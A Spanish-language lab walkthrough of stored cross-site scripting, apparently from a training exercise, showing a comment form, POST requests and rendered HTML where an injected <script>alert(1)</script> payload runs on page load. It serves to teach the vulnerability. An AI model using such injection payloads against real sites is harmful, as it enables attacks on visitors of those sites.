# Stored XSS en Contexto HTML sin Codificación

## Introducción a Stored XSS
Cross-Site Scripting (XSS) es una vulnerabilidad web que permite a un atacante inyectar scripts maliciosos en páginas vistas por otros usuarios.

El **XSS Almacenado (Stored XSS)** ocurre cuando una aplicación web almacena datos de entrada proporcionados por un usuario sin validación o escape adecuado y los muestra en la página a otros usuarios. 

Este tipo de ataque es especialmente peligroso porque el código malicioso permanece en la aplicación y se ejecuta cada vez que un usuario carga la página afectada.

## Caso: Inyección en un Contexto HTML sin Codificación

Supongamos que tenemos una aplicación web con un formulario para comentar en publicaciones.

### Formulario de Comentarios:
```
Leave a comment
Comment:
Name:
Email:
Website:
```

### Publicación de un comentario con HTML embebido
Si enviamos un comentario con etiquetas HTML, podemos ver que se interpretan correctamente:

#### Petición:
```
POST /post/comment

csrf=EWrs1Tcjpy80trDwPXwyql8n6vCRl31M&postId=1&comment=<b>Test</b>&name=test&email=test@test.com&website=https://test.com
```

#### Respuesta generada:
```html
<p>
    <img src="/resources/images/avatarDefault.svg" class="avatar"> 
    <a id="author" href="https://test.com">test</a> | 11 February 2025
</p>
<p><b>Test</b></p>
<p></p>
```

Esto confirma que el comentario no es sanitizado antes de insertarse en la página.

### Ejecución de un **alert()** mediante Stored XSS
Si en lugar de HTML inyectamos un `<script>`, cada vez que la página se cargue, el código se ejecutará en el navegador de cualquier usuario que la visite.

#### Petición maliciosa:
```
POST /post/comment

csrf=EWrs1Tcjpy80trDwPXwyql8n6vCRl31M&postId=1&comment=<script>alert(1)</script>&name=alert&email=alert@alert&website=http://alert.com
```

#### Respuesta generada:
```html
<p>
    <img src="/resources/images/avatarDefault.svg" class="avatar"> 
    <a id="author" href="http://alert.com">alert</a> | 11 February 2025
</p>
<p><script>alert(1)</script></p>
<p></p>
```

### Resultado:
Cada vez que se recarga la página, el navegador ejecuta el script almacenado y aparece el cuadro de alerta con el número `1`.

